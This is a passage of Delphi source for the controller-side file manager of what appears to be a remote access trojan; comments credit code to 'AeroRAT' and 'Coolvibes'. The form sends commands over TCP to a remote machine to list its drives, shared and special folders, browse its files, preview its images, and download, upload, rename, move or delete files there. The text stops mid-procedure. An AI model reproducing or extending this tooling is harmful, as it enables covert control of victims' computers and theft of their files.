unit UnitFilesManager;

interface

uses
  Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
  Dialogs, ImgList, Menus, StdCtrls, ExtCtrls, ComCtrls, UnitConnection, IniFiles,
  IdTCPServer, jpeg, ShellAPI;

const
  WM_SHOW_EDITFILE = WM_USER + 4;

type
  TFormFilesManager = class(TForm)
    stat1: TStatusBar;
    pgc1: TPageControl;
    ts1: TTabSheet;
    spl1: TSplitter;
    tv1: TTreeView;
    lv1: TListView;
    ts2: TTabSheet;
    pnl1: TPanel;
    lbl2: TLabel;
    lbl3: TLabel;
    edtPath: TEdit;
    edtFilename: TEdit;
    chkSubdir: TCheckBox;
    btn1: TButton;
    btn2: TButton;
    lv2: TListView;
    pm2: TPopupMenu;
    O1: TMenuItem;
    E1: TMenuItem;
    V1: TMenuItem;
    H1: TMenuItem;
    N1: TMenuItem;
    R1: TMenuItem;
    P2: TMenuItem;
    N2: TMenuItem;
    N3: TMenuItem;
    V2: TMenuItem;
    C2: TMenuItem;
    P3: TMenuItem;
    R2: TMenuItem;
    D1: TMenuItem;
    E5: TMenuItem;
    N5: TMenuItem;
    I1: TMenuItem;
    N6: TMenuItem;
    D5: TMenuItem;
    U1: TMenuItem;
    pm3: TPopupMenu;
    E7: TMenuItem;
    N7: TMenuItem;
    I2: TMenuItem;
    E8: TMenuItem;
    D3: TMenuItem;
    R3: TMenuItem;
    D4: TMenuItem;
    dlgOpen1: TOpenDialog;
    il1: TImageList;
    ilThumbs: TImageList;
    N4: TMenuItem;
    C1: TMenuItem;
    pm1: TPopupMenu;
    R4: TMenuItem;
    N8: TMenuItem;
    S1: TMenuItem;
    S3: TMenuItem;
    N9: TMenuItem;
    D2: TMenuItem;
    L1: TMenuItem;
    L2: TMenuItem;
    F1: TMenuItem;
    F2: TMenuItem;
    F3: TMenuItem;
    T1: TMenuItem;
    C3: TMenuItem;
    procedure lv1CustomDrawItem(Sender: TCustomListView; Item: TListItem;
      State: TCustomDrawState; var DefaultDraw: Boolean);
    procedure lv1ContextPopup(Sender: TObject; MousePos: TPoint;
      var Handled: Boolean);
    procedure tv1ContextPopup(Sender: TObject; MousePos: TPoint;
      var Handled: Boolean);
    procedure R4Click(Sender: TObject);
    procedure D2Click(Sender: TObject);
    procedure L1Click(Sender: TObject);
    procedure L2Click(Sender: TObject);
    procedure O1Click(Sender: TObject);
    procedure lv1DblClick(Sender: TObject);
    procedure tv1DblClick(Sender: TObject);
    procedure N3Click(Sender: TObject);
    procedure V1Click(Sender: TObject);
    procedure H1Click(Sender: TObject);
    procedure R1Click(Sender: TObject);
    procedure P2Click(Sender: TObject);
    procedure C2Click(Sender: TObject);
    procedure C3Click(Sender: TObject);
    procedure P3Click(Sender: TObject);
    procedure R2Click(Sender: TObject);
    procedure D1Click(Sender: TObject);
    procedure lv1KeyPress(Sender: TObject; var Key: Char);
    procedure E5Click(Sender: TObject);
    procedure I1Click(Sender: TObject);
    procedure D5Click(Sender: TObject);
    procedure F1Click(Sender: TObject);
    procedure F2Click(Sender: TObject);
    procedure F3Click(Sender: TObject);
    procedure T1Click(Sender: TObject);
    procedure C1Click(Sender: TObject);
    procedure E7Click(Sender: TObject);
    procedure I2Click(Sender: TObject);
    procedure E8Click(Sender: TObject);
    procedure R3Click(Sender: TObject);
    procedure D4Click(Sender: TObject);
    procedure D3Click(Sender: TObject);
    procedure S3Click(Sender: TObject);
    procedure S1Click(Sender: TObject);
    procedure lv2ContextPopup(Sender: TObject; MousePos: TPoint;
      var Handled: Boolean);
    procedure lv2KeyPress(Sender: TObject; var Key: Char);
    procedure btn1Click(Sender: TObject);
    procedure btn2Click(Sender: TObject);
    procedure pgc1Change(Sender: TObject);
    procedure FormClose(Sender: TObject; var Action: TCloseAction);
    procedure FormCreate(Sender: TObject);
  protected
    procedure CreateParams(var Params: TCreateParams) ; override;
  private
    { Private declarations }
    Client: PConnectionDatas;
    ExplorerPath, ClipboardPath: string;
    procedure UpdateStatus(Status: string);
    procedure TransferFinished(Sender:TObject);
    procedure AddThumb(Li: TListView; Bmp: TBitmap; FileName: string);
    procedure ShowEditFile(var Msg: TMessage); message WM_SHOW_EDITFILE;
  public
    { Public declarations }
    constructor Create(aOwner: TComponent; ConnDatas: PConnectionDatas);
    procedure OnRead(AThread: TIdPeerThread; ReceivedDatas: string);
  end;

var
  FormFilesManager: TFormFilesManager;
  FtpHost, FtpUser, FtpPass, FtpDir, FtpFilename: string;
  FtpPort: Word;

implementation

uses
  UnitConstants, UnitFunctions, UnitTransfersManager, UnitEditFile,
  UnitStringCompression, UnitRepository, UnitFtpManager;
              
type
  TDriveInfos = record
    Infos: string;
  end;

var
  ImageType: array[0..10] of string = ('.bmp', '.dib', '.jpg', '.jpeg', '.jpe',
                                      '.ico', '.jfif', '.gif', '.png', '.tif',
                                      '.tiff');
                                      
{$R *.dfm}

constructor TFormFilesManager.Create(aOwner: TComponent; ConnDatas: PConnectionDatas);
begin
  inherited Create(aOwner);
  Client := ConnDatas;
end;

procedure TFormFilesManager.CreateParams(var Params: TCreateParams) ;
begin
  inherited;
  Params.ExStyle := Params.ExStyle or WS_EX_APPWINDOW;
  Params.WndParent := 0;
end;
      
function GetDriveIcon(DriveType: string): Integer;
begin
  if DriveType = 'Fixed' then Result := 1 else
  if DriveType = 'Removable' then Result := 4 else
  if DriveType = 'Remote' then Result := 3 else
  if DriveType = 'CDROM' then Result := 2 else Result := 1;
end;
     
function FileAttributes(FindData: TWIN32FindData): string;
begin
  Result := '';
  if FindData.dwFileAttributes and $00000010 <> 0 then Result := Result + 'D';
  if FindData.dwFileAttributes and $00000020 <> 0 then Result := Result + 'A';
  if FindData.dwFileAttributes and $00000002 <> 0 then Result := Result + 'H';
  if FindData.dwFileAttributes and $00000001 <> 0 then Result := Result + 'R';
  if FindData.dwFileAttributes and $00000004 <> 0 then Result := Result + 'S';
end;

//From AeroRAT
function FileTimeToDateTime(FileTime : TFileTime) : TDateTime;
var
  LocalTime : TFileTime;
  SystemTime : TSystemTime;
begin
  Result := EncodeDate(1900,1,1);
  FileTimeToLocalFileTime(FileTime, LocalTime);
  FileTimeToSystemTime(LocalTime, SystemTime);
  Result := SystemTimeToDateTime(SystemTime);
end;

procedure TFormFilesManager.OnRead(AThread: TIdPeerThread; ReceivedDatas: string);
var
  MainCommand: string;
  TmpStr, TmpStr1: string;
  i, j: Integer;
  DrivesNode, SpecialsNode,
  SharedNode, TmpNode: TTreeNode;
  TmpItem: TListItem;
  Stream: TMemoryStream;
  Jpg: TJPEGImage;
  Bmp: TBitmap;
  ExtensionIndex: integer;
  ExtensionList: TStringList;
  SHFileInfo :TSHFileINfo;
  Icon: TIcon;
  FileTransfer: TTransfersManager; 
  dName, dAttrib, FreeSize, TotalSize: string;
  DriveInfos: TDriveInfos;
  FindData: TWin32FindData;
begin
  MainCommand := Copy(ReceivedDatas, 1, Pos('|', ReceivedDatas)-1);
  Delete(ReceivedDatas, 1, Pos('|', ReceivedDatas));

  if MainCommand = FILESLISTDRIVES then
  begin
    tv1.Items.Clear;
    tv1.Items.BeginUpdate;
     
    if DrivesNode <> nil then
    begin
      DrivesNode.Delete;
      DrivesNode := nil;
    end;

    DrivesNode := tv1.Items.Add(nil, Client.Items.SubItems[4]);
    DrivesNode.ImageIndex := 0;
    DrivesNode.SelectedIndex := 0;

    while ReceivedDatas <> '' do
    begin
      TmpStr := Copy(ReceivedDatas, 1, Pos('|', ReceivedDatas)-1);
      Delete(ReceivedDatas, 1, Pos('|', ReceivedDatas));     
      TmpStr1 := Copy(ReceivedDatas, 1, Pos('|', ReceivedDatas)-1);
      Delete(ReceivedDatas, 1, Pos('|', ReceivedDatas));
      dName := Copy(ReceivedDatas, 1, Pos('|', ReceivedDatas)-1);
      Delete(ReceivedDatas, 1, Pos('|', ReceivedDatas));
      dAttrib := Copy(ReceivedDatas, 1, Pos('|', ReceivedDatas)-1);
      Delete(ReceivedDatas, 1, Pos('|', ReceivedDatas));
      TotalSize := Copy(ReceivedDatas, 1, Pos('|', ReceivedDatas)-1);
      Delete(ReceivedDatas, 1, Pos('|', ReceivedDatas));
      FreeSize := Copy(ReceivedDatas, 1, Pos('|', ReceivedDatas)-1);
      Delete(ReceivedDatas, 1, Pos('|', ReceivedDatas));
      Delete(ReceivedDatas, 1, 2);

      TmpNode := tv1.Items.AddChild(DrivesNode, TmpStr + ' [' + dName + ']');
      TmpNode.ImageIndex := GetDriveIcon(TmpStr1);
      TmpNode.SelectedIndex := TmpNode.ImageIndex;

      ZeroMemory(@DriveInfos, SizeOf(TDriveInfos));
      DriveInfos.Infos := 'Drive: ' + TmpStr + #13#10 +                    
                          'System file: ' + dAttrib + #13#10 +
                          'Type: ' + TmpStr1 + #13#10 +
                          'Name: ' + dName + #13#10 +
                          'Size: ' + TotalSize + '(' + FreeSize + ' used)';
      TmpNode.Data := TObject(DriveInfos);
    end;

    DrivesNode.Expanded := True;
    tv1.Items.EndUpdate;
    UpdateStatus('Remote drives listed: ' + IntToStr(DrivesNode.Count));
  end
  else

  if MainCommand = FILESLISTSPECIALSFOLDERS then
  begin
    tv1.Items.BeginUpdate;

    if SpecialsNode <> nil then
    begin
      SpecialsNode.Delete;
      SpecialsNode := nil;
    end;

    SpecialsNode := tv1.Items.Add(nil, 'Specials folders');
    SpecialsNode.ImageIndex := 5;
    SpecialsNode.SelectedIndex := 5;

    while ReceivedDatas <> '' do                               
    begin
      TmpStr := Copy(ReceivedDatas, 1, Pos('|', ReceivedDatas)-1);
      Delete(ReceivedDatas, 1, Pos('|', ReceivedDatas));

      TmpNode := tv1.Items.AddChild(SpecialsNode, TmpStr);
      TmpNode.ImageIndex := 5;
      TmpNode.SelectedIndex := 5;
    end;

    SpecialsNode.Expanded := False;
    tv1.Items.EndUpdate;
    UpdateStatus('Remote specials folders listed: ' + IntToStr(SpecialsNode.Count));
  end
  else

  if MainCommand = FILESLISTSHAREDFOLDERS then
  begin
    if ReceivedDatas = '' then
    begin
      UpdateStatus('No shared folders founded.');
      Exit;
    end;
    
    tv1.Items.BeginUpdate;
             
    if SharedNode <> nil then
    begin
      SharedNode.Delete;
      SharedNode := nil;
    end;

    SharedNode := tv1.Items.Add(nil, 'Shared folders');
    SharedNode.ImageIndex := 5;
    SharedNode.SelectedIndex := 5;

    while ReceivedDatas <> '' do                               
    begin
      TmpStr := Copy(ReceivedDatas, 1, Pos('|', ReceivedDatas)-1);
      Delete(ReceivedDatas, 1, Pos('|', ReceivedDatas));

      TmpNode := tv1.Items.AddChild(SharedNode, TmpStr);
      TmpNode.ImageIndex := 5;
      TmpNode.SelectedIndex := 5;
    end;

    SharedNode.Expanded := False;
    tv1.Items.EndUpdate;
    UpdateStatus('Remote shared folders listed: ' + IntToStr(SharedNode.Count));
  end
  else

  if MainCommand = FILESLISTFOLDERS then
  begin
    lv1.Clear;
    lv1.Items.BeginUpdate;

    Stream := TMemoryStream.Create;
    StrToStream(ReceivedDatas, Stream);
    Stream.Position := 0;

    while Stream.Position < Stream.Size do
    begin
      Stream.ReadBuffer(FindData, SizeOf(TWin32FindData));
      if string(FindData.cFileName) = '.' then Continue;

      TmpItem := lv1.Items.Add;
      TmpItem.Caption := FindData.cFileName;
      TmpItem.SubItems.Add('DIR');
      TmpItem.SubItems.Add(FileSizeToStr(FindData.nFileSizeLow));

      TmpStr := FileAttributes(FindData);
      if Pos('H', TmpStr) > 0 then
      begin
        TmpItem.Data := TObject(clGray);
        TmpItem.Cut := True;
      end;

      TmpItem.SubItems.Add(TmpStr);
      TmpItem.SubItems.Add(DateTimeToStr(FileTimeToDateTime(FindData.ftLastWriteTime)));

      TmpItem.ImageIndex := 5;
    end;

    lv1.Items.EndUpdate;
  end
  else

  if MainCommand = FILESLISTFILES then
  begin
    lv1.Items.BeginUpdate;
          
    Stream := TMemoryStream.Create;
    StrToStream(ReceivedDatas, Stream);
    Stream.Position := 0;

    while Stream.Position < Stream.Size do
    begin
      Stream.ReadBuffer(FindData, SizeOf(TWin32FindData));
      TmpItem := lv1.Items.Add;
      TmpItem.Caption := FindData.cFileName;

      TmpStr := UpperCase(ExtractFileExt(FindData.cFileName));
      Delete(TmpStr, 1, 1);

      TmpItem.SubItems.Add(TmpStr);
      TmpItem.SubItems.Add(FileSizeToStr(FindData.nFileSizeLow));

      TmpStr := FileAttributes(FindData);
      if Pos('H', TmpStr) > 0 then
      begin
        TmpItem.Data := TObject(clGray);
        TmpItem.Cut := True;
      end;

      TmpItem.SubItems.Add(TmpStr);
      TmpItem.SubItems.Add(DateTimeToStr(FileTimeToDateTime(FindData.ftLastWriteTime)));

      if ExtensionList = nil then ExtensionList := TStringList.Create;
      ExtensionList.Clear;
      ExtensionIndex := ExtensionList.IndexOf(ExtractFileExt(TmpItem.Caption));
      if ExtensionIndex = -1 then
      begin
        ExtensionList.Add(ExtractFileExt(TmpItem.Caption));
        SHGetFileInfo(PChar(ExtractFileExt(TmpItem.Caption)), FILE_ATTRIBUTE_NORMAL,
                      SHFileInfo, SizeOf(SHFileInfo),
                      SHGFI_ICON or SHGFI_SMALLICON or SHGFI_USEFILEATTRIBUTES );

        try
          Icon := TIcon.Create;
          Icon.Handle := SHFileInfo.hIcon;
          ExtensionIndex := il1.AddIcon(Icon);
          Icon.Free;
        except
          ExtensionIndex := -1;
        end;
      end;

      TmpItem.ImageIndex := ExtensionIndex;
    end;

    lv1.Items.EndUpdate;
    UpdateStatus('Remote directory listed: ' + IntToStr(lv1.Items.Count));
  end
  else

  if MainCommand = FILESNEWFOLDER then
  begin
    TmpStr := Copy(ReceivedDatas, 1, Pos('|', ReceivedDatas)-1);
    Delete(ReceivedDatas, 1, Pos('|', ReceivedDatas));

    if ReceivedDatas = 'N' then UpdateStatus('Failed to create remote folder "' + TmpStr + '".') else
      UpdateStatus('Remote folder "' + TmpStr + '" created!');
  end
  else

  if MainCommand = FILESCOPYFOLDER then
  begin
    TmpStr := Copy(ReceivedDatas, 1, Pos('|', ReceivedDatas)-1);
    Delete(ReceivedDatas, 1, Pos('|', ReceivedDatas));

    if ReceivedDatas = 'N' then UpdateStatus('Failed to copy remote folder "' + TmpStr + '".') else
      UpdateStatus('Remote folder "' + TmpStr + '" copied!');
  end
  else

  if MainCommand = FILESCOPYFILE then
  begin
    TmpStr := Copy(ReceivedDatas, 1, Pos('|', ReceivedDatas)-1);
    Delete(ReceivedDatas, 1, Pos('|', ReceivedDatas));

    if ReceivedDatas = 'N' then UpdateStatus('Failed to copy remote file "' + TmpStr + '".') else
      UpdateStatus('Remote file "' + TmpStr + '" copied!');
  end
  else

  if MainCommand = FILESMOVEFILE then
  begin
    TmpStr := Copy(ReceivedDatas, 1, Pos('|', ReceivedDatas)-1);
    Delete(ReceivedDatas, 1, Pos('|', ReceivedDatas));

    if ReceivedDatas = 'N' then UpdateStatus('Failed to move remote file "' + TmpStr + '".') else
      UpdateStatus('Remote file "' + TmpStr + '" moved!');
  end
  else

  if MainCommand = FILESMOVEFOLDER then
  begin
    TmpStr := Copy(ReceivedDatas, 1, Pos('|', ReceivedDatas)-1);
    Delete(ReceivedDatas, 1, Pos('|', ReceivedDatas));

    if ReceivedDatas = 'N' then UpdateStatus('Failed to move remote folder "' + TmpStr + '".') else
      UpdateStatus('Remote folder "' + TmpStr + '" moved!');
  end
  else

  if MainCommand = FILESRENAMEFILE then
  begin
    TmpStr := Copy(ReceivedDatas, 1, Pos('|', ReceivedDatas)-1);
    Delete(ReceivedDatas, 1, Pos('|', ReceivedDatas));
    TmpStr1 := Copy(ReceivedDatas, 1, Pos('|', ReceivedDatas)-1);
    Delete(ReceivedDatas, 1, Pos('|', ReceivedDatas));

    lv1.Items.BeginUpdate;
    for i:=0 to lv1.Items.Count-1 do
    begin
      if (lv1.Items.Item[i].Caption = TmpStr) and (TmpStr1 = 'Y') then
      lv1.Items.Item[i].Caption := ReceivedDatas;
    end;
    lv1.Items.EndUpdate;

    if TmpStr1 = 'N' then UpdateStatus('Failed to rename remote file "' + TmpStr + '".') else
      UpdateStatus('Remote file "' + TmpStr + '" renamed!');
  end
  else

  if MainCommand = FILESRENAMEFOLDER then
  begin
    TmpStr := Copy(ReceivedDatas, 1, Pos('|', ReceivedDatas)-1);
    Delete(ReceivedDatas, 1, Pos('|', ReceivedDatas));
    TmpStr1 := Copy(ReceivedDatas, 1, Pos('|', ReceivedDatas)-1);
    Delete(ReceivedDatas, 1, Pos('|', ReceivedDatas));

    lv1.Items.BeginUpdate;
    for i:=0 to lv1.Items.Count-1 do
    begin
      if (lv1.Items.Item[i].Caption = TmpStr) and (TmpStr1 = 'Y') then
      lv1.Items.Item[i].Caption := ReceivedDatas;
    end;
    lv1.Items.EndUpdate;

    if TmpStr1 = 'N' then UpdateStatus('Failed to rename remote folder "' + TmpStr + '".') else
      UpdateStatus('Remote folder "' + TmpStr + '" renamed!');
  end
  else

  if MainCommand = FILESDELETEFILE then
  begin
    TmpStr := Copy(ReceivedDatas, 1, Pos('|', ReceivedDatas)-1);
    Delete(ReceivedDatas, 1, Pos('|', ReceivedDatas));

    lv1.Items.BeginUpdate;
    for i:=0 to lv1.Items.Count-1 do
    begin
      if (lv1.Items.Item[i].Caption = TmpStr) and (ReceivedDatas = 'Y') then
      begin
        lv1.Items.Item[i].Delete;
        Break;
      end;
    end;
    lv1.Items.EndUpdate;

    if ReceivedDatas = 'N' then UpdateStatus('Failed to delete remote file "' + TmpStr + '".') else
      UpdateStatus('Remote file "' + TmpStr + '" deleted!');
  end
  else

  if MainCommand = FILESDELETEFOLDER then
  begin
    TmpStr := Copy(ReceivedDatas, 1, Pos('|', ReceivedDatas)-1);
    Delete(ReceivedDatas, 1, Pos('|', ReceivedDatas));

    lv1.Items.BeginUpdate;
    for i:=0 to lv1.Items.Count-1 do
    begin
      if (lv1.Items.Item[i].Caption = TmpStr) and (ReceivedDatas = 'Y') then
      begin
        lv1.Items.Item[i].Delete;
        Break;
      end;
    end;
    lv1.Items.EndUpdate;

    if ReceivedDatas = 'N' then UpdateStatus('Failed to delete remote folder "' + TmpStr + '".') else
      UpdateStatus('Remote folder "' + TmpStr + '" deleted!');
  end
  else

  if MainCommand = FILESVIEWFILE then
  begin
    SendMessage(Handle, WM_SHOW_EDITFILE, Integer(ReceivedDatas), 0);
  end
  else

  if MainCommand = FILESSEARCHRESULTS then
  begin
    if lv2.SmallImages = ilThumbs then lv2.SmallImages := il1;

    lv2.Clear;
    lv2.Items.BeginUpdate;

    while ReceivedDatas <> '' do
    begin
      TmpItem := lv2.Items.Add;
      TmpItem.Caption := Copy(ReceivedDatas, 1, Pos('|', ReceivedDatas)-1);
      Delete(ReceivedDatas, 1, Pos('|', ReceivedDatas));
      TmpItem.SubItems.Add(Copy(ReceivedDatas, 1, Pos('|', ReceivedDatas)-1));
      Delete(ReceivedDatas, 1, Pos('|', ReceivedDatas));
      Delete(ReceivedDatas, 1, 2);

      if ExtensionList = nil then ExtensionList := TStringList.Create;
      ExtensionList.Clear;
      ExtensionIndex := ExtensionList.IndexOf(ExtractFileExt(TmpItem.Caption));
      if ExtensionIndex = -1 then
      begin
        ExtensionList.Add(ExtractFileExt(TmpItem.Caption));
        SHGetFileInfo(PChar(ExtractFileExt(TmpItem.Caption)), FILE_ATTRIBUTE_NORMAL,
                      SHFileInfo, SizeOf(SHFileInfo),
                      SHGFI_ICON or SHGFI_SMALLICON or SHGFI_USEFILEATTRIBUTES );

        try
          Icon := TIcon.Create;
          Icon.Handle := SHFileInfo.hIcon;
          ExtensionIndex := il1.AddIcon(Icon);
          Icon.Free;
        except
          ExtensionIndex := -1;
        end;
      end;

      TmpItem.ImageIndex := ExtensionIndex;
    end;

    lv2.Items.EndUpdate;
    UpdateStatus('Search results: ' + IntToStr(lv2.Items.Count) + ' file(s) founded!');
    btn2.Click;
  end
  else

  if MainCommand = FILESIMAGEPREVIEW then
  begin
    lv1.SmallImages := ilThumbs;
    ilThumbs.Clear;
    ilThumbs.Width := 100;
    ilThumbs.Height := 100;

    for i := 0 to lv1.Items.Count -1 do lv1.Items.Item[i].ImageIndex := -1;

    while ReceivedDatas <> '' do
    begin
      TmpStr := Copy(ReceivedDatas, 1, Pos('|', ReceivedDatas)-1);
      Delete(ReceivedDatas, 1, Pos('|', ReceivedDatas));

      TmpStr1 := Copy(ReceivedDatas, 1, Pos('|', ReceivedDatas)-1);
      Delete(ReceivedDatas, 1, Pos('|', ReceivedDatas));

      Stream := TMemoryStream.Create;
      StrToStream(TmpStr1, Stream);
      Stream.Position := 0;

      try
        Jpg := TJPEGImage.Create;
        Jpg.LoadFromStream(Stream);
        Stream.Free;
        Bmp := TBitmap.Create;
        Bmp.Width := Jpg.Width;
        Bmp.Height := Jpg.Height;
        Bmp.Canvas.Draw(0, 0, Jpg);
        Jpg.Free;
      except
      end;

      AddThumb(lv1, Bmp, ExtractFileName(TmpStr));
      Bmp.Free;
    end;

    lv1.Items.BeginUpdate;
    for i := 0 to lv1.Items.Count -1 do
    if lv1.Items.Item[i].ImageIndex = -1 then lv1.Items.Item[i].Delete;
    lv1.Items.EndUpdate;

    UpdateStatus('Remote images thumbnails showed!');
  end
  else

  if MainCommand = FILESSEARCHIMAGEPREVIEW then
  begin
    lv2.SmallImages := ilThumbs;
    ilThumbs.Clear;
    ilThumbs.Width := 100;
    ilThumbs.Height := 100;

    for i := 0 to lv2.Items.Count -1 do lv2.Items.Item[i].ImageIndex := -1;

    while ReceivedDatas <> '' do
    begin
      TmpStr := Copy(ReceivedDatas, 1, Pos('|', ReceivedDatas)-1);
      Delete(ReceivedDatas, 1, Pos('|', ReceivedDatas));

      TmpStr1 := Copy(ReceivedDatas, 1, Pos('|', ReceivedDatas)-1);
      Delete(ReceivedDatas, 1, Pos('|', ReceivedDatas));

      Stream := TMemoryStream.Create;
      StrToStream(TmpStr1, Stream);
      Stream.Position := 0;

      try
        Jpg := TJPEGImage.Create;
        Jpg.LoadFromStream(Stream);
        Stream.Free;
        Bmp := TBitmap.Create;
        Bmp.Width := Jpg.Width;
        Bmp.Height := Jpg.Height;
        Bmp.Canvas.Draw(0, 0, Jpg);
        Jpg.Free;
      except
      end;

      AddThumb(lv2, Bmp, ExtractFileName(TmpStr));
      Bmp.Free;
    end;

    lv2.Items.BeginUpdate;
    for i := 0 to lv2.Items.Count -1 do
    if lv2.Items.Item[i].ImageIndex = -1 then lv2.Items.Item[i].Delete;
    lv2.Items.EndUpdate;

    UpdateStatus('Remote images thumbnails showed!');
  end
  else
  
  if MainCommand = FILESDOWNLOADFILE then
  begin
    TmpStr := Copy(ReceivedDatas, 1, Pos('|', ReceivedDatas)-1);
    Delete(ReceivedDatas, 1, Pos('|', ReceivedDatas));
    i := StrToInt(Copy(ReceivedDatas, 1, Pos('|', ReceivedDatas)-1));
    Delete(ReceivedDatas, 1, Pos('|', ReceivedDatas));

    TmpStr1 := GetDownloadsFolder(Client.Identification);
    TmpStr1 := TmpStr1 + '\' + ExtractFileName(TmpStr);

    FileTransfer := TTransfersManager.Create(Athread, TmpStr, i, TmpStr1, True, Client);
    FileTransfer.Callback := Self.TransferFinished;
    FileTransfer.DownloadFile;
  end
  else
            
  if MainCommand = FILESRESUMEDOWNLOAD then
  begin
    TmpStr := Copy(ReceivedDatas, 1, Pos('|', ReceivedDatas)-1);
    Delete(ReceivedDatas, 1, Pos('|', ReceivedDatas));
    i := StrToInt(Copy(ReceivedDatas, 1, Pos('|', ReceivedDatas)-1));
    Delete(ReceivedDatas, 1, Pos('|', ReceivedDatas));

    for j := 0 to FormTransfersManager.lvTransfers.Items.Count-1 do
    begin
      FileTransfer := TTransfersManager(FormTransfersManager.lvTransfers.Items[j].Data);
      if FileTransfer.Filename = TmpStr then
      begin
        FileTransfer.Athread := Athread;
        FileTransfer.Filesize := i;
        FileTransfer.ResumeTransfer;
        Exit;
      end;
    end;
  end
  else

  if MainCommand = FILESUPLOADFILEFROMLOCAL then
  begin
    i := MyGetFileSize(ReceivedDatas);
    FileTransfer := TTransfersManager.Create(Athread, ReceivedDatas, i, '', False, Client);
    FileTransfer.UploadFile;
  end;;
end;

procedure TFormFilesManager.UpdateStatus(Status: string);
begin
  stat1.Panels.Items[0].Text := Status;
end;
    
procedure TFormFilesManager.ShowEditFile(var Msg: TMessage);
var
  TmpStr: string;
  TmpForm: TFormEditFile;
begin
  TmpStr := string(Msg.WParam);
  TmpForm := TFormEditFile.Create(Self, Client, TmpStr);
  TmpForm.redt1.Font.Size := 9;
  TmpForm.Show;
end;
  
//From Coolvibes
function GetNodeRoot(Node: TTreeNode): string;
begin
  repeat
    Result := Node.Text + '\' + Result;
    Node := Node.Parent;
  until not Assigned(Node)
end;

procedure TFormFilesManager.TransferFinished(Sender:TObject);
var
  FileTransfer: TTransfersManager;
  i : integer;
begin
  for i := 0 to FormTransfersManager.lvTransfers.Items.Count -1 do
  begin
    FileTransfer := TTransfersManager(FormTransfersManager.lvTransfers.Items[i].Data);
    if not FileTransfer.Transfering and not FileTransfer.Cancelled and not FileTransfer.Terminated and FileTransfer.FileDownload then
    begin
      SendDatas(Client.AThread, FILESRESUMEDOWNLOAD + '|' + FileTransfer.Filename + '|' + IntToStr(FileTransfer.Recv) + '|');
      Exit;
    end;
  end;
end;
        
procedure TFormFilesManager.AddThumb(Li: TListView; Bmp: TBitmap; FileName: string);
var
  i: Integer;
begin
  for i := 0 to Li.Items.Count -1 do
  begin
    if Li.Items[i].Caption = FileName then
    Li.Items[i].ImageIndex := ilThumbs.Add(Bmp, nil);
  end;
end;

procedure TFormFilesManager.lv1CustomDrawItem(Sender: TCustomListView;
  Item: TListItem; State: TCustomDrawState; var DefaultDraw: Boolean);
begin
  if Item.Data <> nil then Sender.Canvas.Font.Color := TColor(Item.Data);
end;

procedure TFormFilesManager.lv1ContextPopup(Sender: TObject;
  MousePos: TPoint; var Handled: Boolean);
var
  i: Integer;
begin
  if not Assigned(lv1.Selected) then
  begin
    for i := 0 to pm2.Items.Count - 1 do pm2.Items[i].Enabled := False;
    pm2.Items[18].Enabled := True;
    if lv1.Items.Count > 0 then
    begin
      pm2.Items[1].Enabled := True;
      pm2.Items[7].Enabled := True;
      pm2.Items[7].Items[0].Enabled := False;
      pm2.Items[7].Items[1].Enabled := False;
      pm2.Items[7].Items[2].Enabled := True;
      pm2.Items[12].Enabled := True;
      pm2.Items[15].Enabled := True;  
      pm2.Items[18].Enabled := True;
    end;
  end
  else
  begin
    for i := 0 to pm2.Items.Count - 1 do pm2.Items[i].Enabled := True;
    pm2.Items[7].Items[2].Enabled := False;
  end;
end;

procedure TFormFilesManager.tv1ContextPopup(Sender: TObject;
  MousePos: TPoint; var Handled: Boolean);
var
  i: Integer;
begin
  if not Assigned(tv1.Selected) then
  begin
    for i := 0 to pm1.Items.Count - 1 do pm1.Items[i].Enabled := False;
    pm1.Items[0].Enabled := True;
  end
  else for i := 0 to pm1.Items.Count - 1 do pm1.Items[i].Enabled := True;
end;

procedure TFormFilesManager.lv2ContextPopup(Sender: TObject;
  MousePos: TPoint; var Handled: Boolean);
var
  i: Integer;
begin
  if not Assigned(lv2.Selected) then
    for i := 0 to pm3.Items.Count - 1 do pm3.Items[i].Enabled := False
  else for i := 0 to pm3.Items.Count - 1 do pm3.Items[i].Enabled := True;
end;

procedure TFormFilesManager.R4Click(Sender: TObject);
begin
  SendDatas(Client.AThread, FILESLISTDRIVES + '|');   
  UpdateStatus('Requesting remote drives list, please wait...');
end;

procedure TFormFilesManager.D2Click(Sender: TObject);
begin
  if not Assigned(tv1.Selected) then Exit;
  if tv1.Selected.Data <> nil then
  MessageBox(Handle, PChar(TDriveInfos(tv1.Selected.Data).Infos), 'Drive infos',
             MB_OK or MB_ICONINFORMATION or MB_SYSTEMMODAL or MB_SETFOREGROUND or MB_TOPMOST);
end;

procedure TFormFilesManager.L1Click(Sender: TObject);
begin
  SendDatas(Client.AThread, FILESLISTSPECIALSFOLDERS + '|');
  UpdateStatus('Requesting remote specials folders list, please wait...');
end;

procedure TFormFilesManager.L2Click(Sender: TObject);
begin
  SendDatas(Client.AThread, FILESLISTSHAREDFOLDERS + '|');
  UpdateStatus('Requesting remote shared folders list, please wait...');
end;

procedure TFormFilesManager.O1Click(Sender: TObject);
var
  TmpStr: string;
begin
  if lv1.Selected.Caption = '..' then
  begin
    TmpStr := ExplorerPath;
    TmpStr := Copy(TmpStr, 1, Length(TmpStr)-1);
    TmpStr := Copy(TmpStr, 1, LastDelimiter('\', TmpStr));
    ExplorerPath := TmpStr;
    SendDatas(Client.AThread, FILESLISTFOLDERS + '|' + ExplorerPath);
    UpdateStatus('Requesting remote directory list, please wait...');
  end
  else
  begin
    if lv1.Selected.ImageIndex = 5 then
    begin
      ExplorerPath := ExplorerPath + lv1.Selected.Caption + '\';
      SendDatas(Client.AThread, FILESLISTFOLDERS + '|' + ExplorerPath);
      UpdateStatus('Requesting remote directory list, please wait...');
    end;
  end;
end;

procedure TFormFilesManager.lv1DblClick(Sender: TObject);
begin
  O1.Click;
end;

procedure TFormFilesManager.tv1DblClick(Sender: TObject);
var
  TmpStr, TmpStr1: string;
begin
  ExplorerPath := GetNodeRoot(tv1.Selected);
  if (ExplorerPath = '') or (ExplorerPath = Client.ConnInfos.User_Computer) then Exit;

  TmpStr := 'Specials folders';
  TmpStr1 := 'Shared folders';
  if Copy(ExplorerPath, 1, Pos('\', ExplorerPath)-1) = Client.ConnInfos.User_Computer then
    Delete(ExplorerPath, 1, Length(Client.ConnInfos.User_Computer) + 1)
  else if Copy(ExplorerPath, 1, Pos('\', ExplorerPath)-1) = TmpStr then Delete(ExplorerPath, 1, Length(TmpStr) + 1) else
